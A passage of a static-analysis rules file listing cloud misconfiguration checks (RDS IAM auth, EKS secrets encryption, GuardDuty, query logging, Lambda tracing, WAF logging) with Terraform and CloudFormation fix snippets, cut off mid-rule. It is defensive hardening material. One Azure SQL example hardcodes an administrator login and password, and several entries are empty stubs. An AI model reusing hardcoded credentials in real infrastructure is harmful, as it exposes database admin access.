<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster</li>
<li><strong>Argument:</strong> iam_database_authentication_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_cluster" "default" {
  cluster_identifier      = "aurora-cluster-demo"
    ...
+  iam_database_authentication_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-an-amazon-rds-clusters-have-iam-authentication-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-an-amazon-rds-clusters-have-iam-authentication-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-an-amazon-rds-clusters-have-iam-authentication-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_7</key>
    <name>Ensure SQL servers have Azure Active Directory admin configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sql-servers-do-not-have-azure-active-directory-admin-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sql-servers-do-not-have-azure-active-directory-admin-configured"></div>SQL servers do not have Azure Active Directory admin configured</div><a aria-label="Skip link to SQL servers do not have Azure Active Directory admin configured" class="heading-anchor-icon fa fa-anchor" href="#sql-servers-do-not-have-azure-active-directory-admin-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use Azure Active Directory Authentication for authentication with SQL Database.</p>
<p>Azure Active Directory authentication is a mechanism to connect to Microsoft Azure SQL Database and SQL Data Warehouse by using identities in Azure Active Directory (Azure AD). With Azure AD authentication, identities of database users and other Microsoft services can be managed in one central location. Central ID management provides a single place to manage database users and simplifies permission management.</p>
<ul>
<li>It provides an alternative to SQL Server authentication.</li>
<li>Helps stop the proliferation of user identities across database servers.</li>
<li>Allows password rotation in a single place.</li>
<li>Customers can manage database permissions using external (AAD) groups.</li>
<li>It can eliminate storing passwords by enabling integrated Windows authentication and other forms of authentication supported by Azure Active Directory.</li>
<li>Azure AD authentication uses contained database users to authenticate identities at the database level.</li>
<li>Azure AD supports token-based authentication for applications connecting to SQL Database.</li>
<li>Azure AD authentication supports ADFS (domain federation) or native user/password authentication for a local Azure Active Directory without domain synchronization.</li>
<li>Azure AD supports connections from SQL Server Management Studio that use Active Directory Universal Authentication, which includes Multi-Factor Authentication (MFA). MFA includes strong authentication with a range of easy verification options &#8212; phone call, text message, smart cards with pin, or mobile app notification.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_sql_server, azurerm_sql_active_directory_administrator</li>
<li><strong>Argument:</strong> server_name (of azurerm_sql_active_directory_administrator)</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "azurerm_client_config" "current" {}

resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_sql_server" "sql_server_good" {
  name                         = "mysqlserver"
  resource_group_name          = azurerm_resource_group.example.name
  location                     = azurerm_resource_group.example.location
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}


resource "azurerm_sql_active_directory_administrator" "example" {
+ server_name         = azurerm_sql_server.sql_server_good.name
  resource_group_name = azurerm_resource_group.example.name
  login               = "sqladmin"
  tenant_id           = data.azurerm_client_config.current.tenant_id
  object_id           = data.azurerm_client_config.current.object_id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-active-directory-admin-is-configured' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-active-directory-admin-is-configured</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-active-directory-admin-is-configured' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_129</key>
    <name>Ensure respective logs of Amazon RDS are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="respective-logs-of-amazon-rds-are-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-respective-logs-of-amazon-rds-are-disabled"></div>Respective logs of Amazon RDS are disabled</div><a aria-label="Skip link to Respective logs of Amazon RDS are disabled" class="heading-anchor-icon fa fa-anchor" href="#respective-logs-of-amazon-rds-are-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use CloudWatch logging types for Amazon Relational Database Service (Amazon RDS)  instances</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_db_instance</li>
<li><strong>Argument:</strong> enabled_cloudwatch_logs_exports</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_db_instance" "mysql" {
  allocated_storage = 5
    ...
+ enabled_cloudwatch_logs_exports = ["general", "error", "slowquery"]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-respective-logs-of-amazon-relational-database-service-amazon-rds-are-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-respective-logs-of-amazon-relational-database-service-amazon-rds-are-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-respective-logs-of-amazon-relational-database-service-amazon-rds-are-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_58</key>
    <name>Ensure AWS EKS cluster has secrets encryption enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-eks-cluster-does-not-have-secrets-encryption-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-eks-cluster-does-not-have-secrets-encryption-enabled"></div>AWS EKS cluster does not have secrets encryption enabled</div><a aria-label="Skip link to AWS EKS cluster does not have secrets encryption enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-eks-cluster-does-not-have-secrets-encryption-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Secrets in Kubernetes enables managing sensitive information such as passwords and API keys using Kubernetes-native APIs. When creating a secret resource the Kubernetes API server stores it in <strong>etcd</strong> in a base64 encoded form. For example, using kubectl create secret, EKS can encrypt etcd volumes at disk-level using AWS-managed encryption keys.</p>
<p>AWS encourages using envelope encryption to encrypt a key with another key. The motivation is security best practice. Applications store sensitive data as part of a defense in depth security strategy. A master key is stored in AWS KMS that is then utilized for data key generation in the Kubernetes API server. It is also used to encrypt/decrypt sensitive data stored in Kubernetes secrets.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---builtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-builtime"></div>Fix - Builtime</div><a aria-label="Skip link to Fix - Builtime" class="heading-anchor-icon fa fa-anchor" href="#fix---builtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resource:</strong> AWS::EKS::Cluster<br/>
<strong>Argument:</strong> Properties.EncryptionConfig.Resources.secrets</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  myCluster:
    Type: 'AWS::EKS::Cluster'
    Properties:
      ...
      EncryptionConfig:
        - Resources:
+         - secrets
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_kubernetes_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_3</key>
    <name>Ensure GuardDuty is enbaled to specific org/region</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="guardduty-is-not-enbaled-to-specific-orgregion"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-guard-duty-is-not-enbaled-to-specific-org-region"></div>GuardDuty is not enbaled to specific org/region</div><a aria-label="Skip link to GuardDuty is not enbaled to specific org/region" class="heading-anchor-icon fa fa-anchor" href="#guardduty-is-not-enbaled-to-specific-orgregion"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_guardduty_detector, aws_guardduty_organization_configuration</li>
<li><strong>Argument:</strong> <em>auto_enable</em> of aws_guardduty_organization_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_guardduty_detector" "ok" {
  enable = true
}

resource "aws_guardduty_organization_configuration" "example" {
  auto_enable = true
  detector_id = aws_guardduty_detector.ok.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-guardduty-is-enabled-to-specific-orgregion' target='_blank'> https://docs.bridgecrew.io/docs/ensure-guardduty-is-enabled-to-specific-orgregion</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-guardduty-is-enabled-to-specific-orgregion' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_27</key>
    <name>Ensure Postgres RDS has Query Logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-postgres-rds-as-aws_rds_cluster-has-query-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-postgres-rds-as-aws-rds-cluster-has-query-logging-enabled"></div>Ensure Postgres RDS as aws_rds_cluster has Query Logging enabled</div><a aria-label="Skip link to Ensure Postgres RDS as aws_rds_cluster has Query Logging enabled" class="heading-anchor-icon fa fa-anchor" href="#ensure-postgres-rds-as-aws_rds_cluster-has-query-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check ensures that you have enabled query logging set up for your PostgreSQL database cluster. A cluster needs to have a non-default parameter group and two parameters set - that of <em>log_statement</em> and <em>log_min_duration_statement</em>, these need to be set to <em>all</em> and <em>1</em> respectively to get sufficient logs.</p>
<p> <em>Note</em><br/>
Setting querying logging can expose secrets (including passwords) from your queries, - restrict and encrypt to mitigate. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-remediation"></div>Fix - Buildtime Remediation</div><a aria-label="Skip link to Fix - Buildtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>You will need to have a resource aws_rds_cluster_parameter_group that is referred to your aws_rds_cluster_parameter_group attribute: db_cluster_parameter_group_name. With that in place the following parameters need to be set: </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_rds_cluster_parameter_group.examplea.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_rds_cluster_parameter_group.examplea.tf">resource "aws_rds_cluster_parameter_group" "examplea" {
  name = "rds-cluster-pg"
  family      = "aurora5.7"
  description = "RDS default cluster parameter group"

+  parameter {
+    name="log_statement"
+    value="all"
+  }

+  parameter {
+    name="log_min_duration_statement"
+    value="1"
+  }
}
</code></pre></div></div>
<p>For more details see the aws docs here: <a href="https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html" target="_self">https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-postgres-rds-has-query-logging-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-postgres-rds-has-query-logging-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-postgres-rds-has-query-logging-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_22</key>
    <name>Ensure Azure Cognitive Services enables Customer Managed Keys (CMKs) for encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cognitive-services-does-not-customer-managed-keys-cmks-for-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cognitive-services-does-not-customer-managed-keys-cm-ks-for-encryption"></div>Azure Cognitive Services does not Customer Managed Keys (CMKs) for encryption</div><a aria-label="Skip link to Azure Cognitive Services does not Customer Managed Keys (CMKs) for encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-cognitive-services-does-not-customer-managed-keys-cmks-for-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Cognitive Services which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Cognitive Services data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="runtime---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-runtime-buildtime"></div>Runtime - Buildtime </div><a aria-label="Skip link to Runtime - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#runtime---buildtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-enables-customer-managed-keys-cmks-for-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-enables-customer-managed-keys-cmks-for-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-enables-customer-managed-keys-cmks-for-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_36</key>
    <name>Ensure AWS Terraform does not send SSM secrets to untrusted domains over HTTP</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-terraform-sends-ssm-secrets-to-untrusted-domains-over-http"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-terraform-sends-ssm-secrets-to-untrusted-domains-over-http"></div>AWS Terraform sends SSM secrets to untrusted domains over HTTP</div><a aria-label="Skip link to AWS Terraform sends SSM secrets to untrusted domains over HTTP" class="heading-anchor-icon fa fa-anchor" href="#aws-terraform-sends-ssm-secrets-to-untrusted-domains-over-http"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-terraform-does-not-send-ssm-secrets-to-untrusted-domains-over-http' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-terraform-does-not-send-ssm-secrets-to-untrusted-domains-over-http</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-terraform-does-not-send-ssm-secrets-to-untrusted-domains-over-http' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_50</key>
    <name>Ensure AWS Lambda functions with tracing are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-lambda-functions-with-tracing-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-lambda-functions-with-tracing-not-enabled"></div>AWS Lambda functions with tracing not enabled</div><a aria-label="Skip link to AWS Lambda functions with tracing not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-lambda-functions-with-tracing-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>X-Ray tracing in lambda functions allows you to visualize and troubleshoot errors and performance bottlenecks, and investigate requests that resulted in an error.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/lambda/" target="_self">Amazon Lambda console</a>.</li>
<li>Open the function to modify.</li>
<li>Click the <strong>Configuration</strong> tab.</li>
<li>Open the <strong>Monitoring and operations tools</strong> on the left side.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Enable <strong>Active tracing</strong> for AWS X-ray.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable X-Ray tracing for a function, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws lambda update-function-configuration --function-name MY_FUNCTION \
--tracing-config Mode=Active
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="buildtime-resource"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-buildtime-resource"></div>Buildtime Resource</div><a aria-label="Skip link to Buildtime Resource" class="heading-anchor-icon fa fa-anchor" href="#buildtime-resource"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>Add the following block to a Terraform Lambda resource to add X-Ray tracing:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">tracing_config {
  mode = "Active"
}
</code></pre>
<p>For CloudFormation, use the following block under <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Properties</code>:</p>
<p>JSON:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">"TracingConfig": {
  "Mode": "Active"
}
</code></pre>
<p>YAML:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">TracingConfig: 
  Mode: Active 
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_serverless_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_serverless_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_serverless_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_31</key>
    <name>Ensure WAF2 has a Logging Configuration</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-waf2-does-not-have-a-logging-configuration"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-waf-2-does-not-have-a-logging-configuration"></div>AWS WAF2 does not have a Logging Configuration</div><a aria-label="Skip link to AWS WAF2 does not have a Logging Configuration" class="heading-anchor-icon fa fa-anchor" href="#aws-waf2-does-not-have-a-logging-configuration"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>You can enable comprehensive logging on a web access control list (web ACL) using an Amazon Kinesis Data Firehose stream destined to an Amazon S3 bucket in the same Region. To do so, you must use three AWS services:<br/>
AWS WAF to create the logs<br/>
Kinesis Data Firehose to receive the logs<br/>
Amazon S3 to store the logs<br/>
Note: AWS WAF and Kinesis Data Firehose must be running in the same Region.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_wafv2_web_acl</li>
<li><strong>Attribute</strong>: visibility_config - (Required) Defines and enables Amazon CloudWatch metrics and web request sample collection. See Visibility Configuration below for details.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_wafv2_web_acl" "example" {
  name        = "rate-based-example"
  description = "Example of a rate based statement."
  scope       = "REGIONAL"

  ...
++    visibility_config {
      cloudwatch_metrics_enabled = false
      metric_name                = "friendly-rule-metric-name"
      sampled_requests_enabled   = false
    }
  }

++ resource "aws_wafv2_web_acl_logging_configuration" "example" {
  log_destination_configs = [aws_kinesis_firehose_delivery_stream.example.arn]
